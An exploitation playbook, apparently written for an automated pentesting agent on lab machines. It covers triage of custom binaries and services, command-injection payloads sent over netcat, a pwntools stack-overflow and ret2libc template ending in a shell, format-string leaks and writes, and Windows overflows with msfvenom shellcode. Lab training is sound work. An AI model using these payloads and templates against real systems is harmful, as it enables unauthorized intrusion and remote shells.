# Custom binaries and network services

A service on a high/odd port that netcat shows a custom banner for, or a SUID
binary that isn't stock, is often the intended path — and usually a memory-safety
bug or a trivially injectable command handler, not a CVE. Read the binary before
you fuzz it.

The container has `gdb`+`pwndbg` (or `gef`), `pwntools`, `ropper`, `ROPgadget`,
`one_gadget`, `checksec`, `radare2`, `ghidra` headless. Note the arch: the
container is arm64, so an x86-64 target binary runs under emulation only if
`qemu-user` is present — otherwise analyse statically and build the exploit to
fire over the network against the real (x86) target.

## Triage first

```bash
pwnloop x "file ./svc; checksec --file=./svc"      # arch, NX, PIE, canary, RELRO
pwnloop x "strings -n 6 ./svc | grep -iE 'flag|/bin/|system|pass|%s|%n|nc '"
pwnloop x "rabin2 -i ./svc"                          # imports: system, gets, strcpy, execve?
```
`checksec` sets the whole strategy:
- **No canary + NX off** → classic stack overflow to shellcode.
- **No canary + NX on** → ret2libc / ROP.
- **PIE + full RELRO + canary** → need an info leak first; harder, rarely the
  intended lab path unless a leak is handed to you.

Dangerous imports tell you the bug class before you open a disassembler:
`gets`/`strcpy`/`sprintf`/`scanf("%s")` → overflow; `printf(user)` → format
string; `system`/`popen`/`exec*` with reachable input → command injection.

## Command-injection handlers (the most common lab shape)

Many "custom services" just shell out. Test the same payloads as web command
injection against the raw socket:
```bash
pwnloop x "printf 'ping 127.0.0.1; id\n' | nc $T <port>"
# metacharacters: ; | & $(id) `id` %0a  — and argument-injection if it splits on spaces
```
A menu-driven service that runs `tar`, `ping`, `nslookup`, `zip` on your input is
this class. No memory corruption needed.

## Stack buffer overflow → shell

```python
from pwn import *
context.binary = e = ELF('./svc'); context.log_level='info'
p = remote('TARGET', PORT)
# 1. find offset: send cyclic(200), read $pc/$sp in gdb, cyclic_find(<val>)
off = 72
# 2a. NX off: jmp to shellcode on the stack
sc  = asm(shellcraft.sh())
# 2b. NX on: ret2libc — leak a libc addr via PUTS(GOT), compute base, ret to system("/bin/sh")
payload = flat({off: [ e.plt.puts, e.symbols.main, e.got.puts ]})   # leak stage
p.sendline(payload)
# ...recv leak, resolve libc, second stage to system("/bin/sh")
p.interactive()
```

Practical notes that save the most time:
- **Offset:** `cyclic(200)` in, `cyclic_find()` on the value that landed in the
  saved return address. Don't eyeball it.
- **Bad chars:** `\x00 \x0a \x0d` break most string readers; check by sending
  `\x01..\xff` and diffing what survives in memory.
- **libc:** match the leaked symbol offsets on a libc database, or use the
  target's own libc if you recovered it. `one_gadget ./libc.so.6` often replaces
  the whole second stage with a single `execve("/bin/sh")` address (mind its
  constraints).
- **ASLR/PIE:** you need a leak. A format-string or an un-NULL-terminated read
  that echoes stack data is the usual source.

## Format string

`printf(user_input)` with no format:
- **Leak:** `%p %p %p ...` or `%N$p` to read the stack (find your buffer, libc,
  canary, PIE base).
- **Write:** `%n` / `%hn` with the target address on the stack → overwrite a GOT
  entry (partial RELRO) with `system`, or a return address. `pwntools`
  `fmtstr_payload(offset, {addr: value})` builds it.

## Windows custom services

Same triage; the classic OSCP-style `SEH`/`EIP` overflow still appears. Fuzz with
increasing lengths, find the offset with a cyclic pattern
(`msf-pattern_create`/`_offset`), check bad chars, find a `jmp esp` in a
non-ASLR module (`!mona jmpesp`/`ropper`), then a msfvenom shellcode staged to
your `tun0`. Read the full crash in a debugger rather than guessing.

## When it isn't the path

Binary exploitation is time-expensive. Time-box it like anything else: if after
~30 min you don't have an offset and a crash you understand, log it `PARKED` and
work the other leads. On a lab box a memory bug is usually the *whole* intended
path when it's present — so if the box also has an obvious web/AD route, that's
probably the intended one and the binary is a distraction.
